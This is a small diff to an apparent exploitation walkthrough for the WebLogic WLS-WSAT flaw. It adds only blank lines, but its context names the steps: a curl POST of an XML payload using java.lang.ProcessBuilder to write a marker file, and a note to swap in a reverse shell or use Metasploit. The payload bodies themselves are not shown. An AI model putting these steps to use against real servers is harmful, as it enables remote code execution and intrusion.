@@ -17,6 +17,7 @@ The flaw exists inside the **WLS-WSAT (WebLogic Web Services Atomic Transaction)
 ## Exploitation Walkthrough
 
 ### 1. Verification of Vulnerability via Curl
+
 Post an XML payload instantiating `java.lang.ProcessBuilder` to write a marker file:
 
 ```bash
@@ -42,6 +43,7 @@ curl -X POST -H "Content-Type: text/xml" \
 ```
 
 ### 2. Spawning Reverse Shell
+
 Replace the command string with a reverse shell or use Metasploit:
 
 ```bash
